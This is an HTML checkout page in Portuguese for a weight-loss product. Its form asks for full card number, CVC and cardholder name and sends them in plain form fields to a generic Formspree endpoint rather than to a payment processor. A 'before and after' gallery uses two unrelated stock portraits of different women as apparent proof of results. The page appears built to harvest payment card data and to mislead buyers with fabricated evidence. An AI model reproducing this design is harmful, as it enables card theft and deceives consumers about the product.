
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checkout - Emagrecimento</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #ffe0ec, #ffffff);
      padding: 30px;
      color: #333;
    }
    h1 {
      text-align: center;
      color: #ff3366;
    }
    form {
      max-width: 500px;
      margin: 0 auto;
      background-color: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    button {
      background-color: #ff3366;
      color: white;
      border: none;
      padding: 15px;
      margin-top: 20px;
      width: 100%;
      font-size: 18px;
      border-radius: 6px;
      cursor: pointer;
    }
    .gallery {
      display: flex;
      justify-content: space-around;
      margin-top: 40px;
    }
    .gallery img {
      width: 100px;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <h1>Complete sua compra</h1>
  <form action="https://formspree.io/f/xwplaaqz" method="POST">
    <label for="nome">Nome completo</label>
    <input type="text" id="nome" name="nome" required>

    <label for="email">E-mail</label>
    <input type="email" id="email" name="email" required>

    <label for="pagamento">Método de Pagamento</label>
    <select id="pagamento" name="pagamento" required>
      <option value="pix">PIX</option>
      <option value="cartao">Cartão de Crédito</option>
    </select>

    <label for="cartao">Número do Cartão</label>
    <input type="text" id="cartao" name="cartao">

    <label for="cvc">CVC</label>
    <input type="text" id="cvc" name="cvc">

    <label for="nome-cartao">Nome no Cartão</label>
    <input type="text" id="nome-cartao" name="nome-cartao">

    <button type="submit">Finalizar Compra</button>
  </form>

  <h2 style="text-align:center;margin-top:60px;">Antes e Depois</h2>
  <div class="gallery">
    <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Antes">
    <img src="https://randomuser.me/api/portraits/women/45.jpg" alt="Depois">
  </div>
</body>
</html>
